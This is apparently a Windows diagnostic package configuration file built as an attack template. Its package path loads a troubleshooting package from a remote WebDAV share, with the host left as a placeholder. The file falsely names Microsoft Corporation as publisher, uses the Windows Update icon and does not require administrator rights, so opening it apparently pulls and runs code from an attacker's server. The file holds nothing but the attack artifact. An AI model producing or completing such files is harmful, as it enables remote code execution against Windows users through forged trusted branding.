<?xml version="1.0" encoding="utf-8"?>
<PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008">
  <Execution>
    <Package Path="\\WEBDAV_URL@ssl\DavWWWRoot\package" />
    <Name>Some name</Name>
    <Description>Some description</Description>
    <Icon>@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001</Icon>
  </Execution>

  <Index>
    <Id>Custom</Id>
    <RequiresAdminPrivileges>false</RequiresAdminPrivileges>
    <PrivacyUrl>http://go.microsoft.com/fwlink/?LinkId=190175</PrivacyUrl>
    <Version>1.0</Version>
    <PublisherName>Microsoft Corporation</PublisherName>
    <Category>@%windir%\system32\DiagCpl.dll,-412</Category>
    <Keyword>@%windir%\system32\DiagCpl.dll,-27</Keyword>
  </Index>
</PackageConfiguration>